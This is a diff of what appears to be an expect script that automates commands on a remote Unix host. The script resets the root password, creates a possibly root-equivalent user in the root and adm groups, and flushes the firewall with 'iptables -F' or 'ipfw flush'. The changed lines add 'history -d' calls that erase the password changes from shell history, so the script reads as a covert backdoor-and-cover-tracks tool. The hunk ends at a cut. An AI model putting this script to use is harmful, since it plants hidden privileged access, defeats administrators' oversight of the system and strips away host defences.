@@ -173,7 +173,7 @@ fi
 interact -o -nobuffer -re \$prompt return
 send "history -d \`history | wc -l\`; /bin/sh\r"
 interact -o -nobuffer -re \$prompt return
-send "echo -e '$newRootPass\\\n$newRootPass' | passwd root\r"
+send "bash -c \"echo -e '$newRootPass\\\n$newRootPass' | passwd root; history -d \`history | wc -l\`\"\r"
 interact -o -nobuffer -re \$prompt return
 send "useradd -g root -M -o -u $newUserID $newUser\r"
 interact -o -nobuffer -re \$prompt return
@@ -185,7 +185,7 @@ send "usermod -a -G adm $newUser\r"
 interact -o -nobuffer -re \$prompt return
 send "pwck -s\r"
 interact -o -nobuffer -re \$prompt return
-send "echo -e '$newPass\\\n$newPass' | passwd $newUser\r"
+send "bash -c \"echo -e '$newPass\\\n$newPass' | passwd $newUser; history -d \`history | wc -l\`\"\r"
 interact -o -nobuffer -re \$prompt return
 send "/usr/bin/env iptables -F || ipfw flush\r"
 MORE
